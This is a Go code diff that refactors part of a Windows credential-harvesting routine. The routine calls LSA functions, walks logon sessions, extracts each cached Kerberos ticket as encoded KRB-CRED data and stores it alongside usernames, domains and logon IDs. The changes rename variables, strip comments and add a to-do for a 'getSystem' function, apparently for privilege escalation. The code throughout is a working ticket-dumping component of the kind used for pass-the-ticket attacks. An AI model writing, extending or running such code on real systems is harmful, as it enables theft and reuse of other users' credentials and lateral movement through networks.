@@ -526,7 +526,7 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		uintptr(lsaHandle),
 		uintptr(authPackage),
 		uintptr(bufferPtr),
-		uintptr(totalSize),
+		totalSize,
 		uintptr(unsafe.Pointer(&responsePtr)),
 		uintptr(unsafe.Pointer(&returnLength)),
 		uintptr(unsafe.Pointer(&protocolStatus)),
@@ -549,7 +549,6 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 			copy(encodedTicket,
 				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])
 
-			// Parse the encoded ticket
 			krbCred, err := parseTicketData(encodedTicket)
 			if err != nil {
 				return nil, fmt.Errorf("failed to parse ticket data: %v", err)
@@ -659,6 +658,7 @@ func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCr
 }
 
 func getLsaHandle() (windows.Handle, error) {
+	// todo: add getSystem() function
 	var lsaHandle windows.Handle
 	ret, _, err := LsaConnectUntrusted.Call(
 		uintptr(unsafe.Pointer(&lsaHandle)),
@@ -708,25 +708,23 @@ func GetKerberosTickets() []map[string]interface{} {
 
 	ticketCache = make([]map[string]interface{}, 0)
 	for _, cred := range sessionCreds {
-		// For each ticket in the session credentials
-		for _, tkt := range cred.Tickets {
-			// Extract the ticket using server name
-			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, tkt.ServerName)
+		for _, ticket := range cred.Tickets {
+			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
 			if err != nil {
-				continue // Skip tickets that fail to extract
+				continue
 			}
 
 			ticket := map[string]interface{}{
 				"username":    cred.LogonSession.Username,
 				"domain":      cred.LogonSession.LogonDomain,
 				"logonId":     cred.LogonSession.LogonID.LowPart,
-				"serverName":  tkt.ServerName,
-				"serverRealm": tkt.ServerRealm,
-				"startTime":   tkt.StartTime.Format(time.RFC3339),
-				"endTime":     tkt.EndTime.Format(time.RFC3339),
-				"renewTime":   tkt.RenewTime.Format(time.RFC3339),
-				"flags":       tkt.TicketFlags.String(),
-				"encType":     tkt.EncryptionType,
+				"serverName":  ticket.ServerName,
+				"serverRealm": ticket.ServerRealm,
+				"startTime":   ticket.StartTime.Format(time.RFC3339),
+				"endTime":     ticket.EndTime.Format(time.RFC3339),
+				"renewTime":   ticket.RenewTime.Format(time.RFC3339),
+				"flags":       ticket.TicketFlags.String(),
+				"encType":     ticket.EncryptionType,
 				"krbCred":     extractedTicket,
 			}
 			ticketCache = append(ticketCache, ticket)
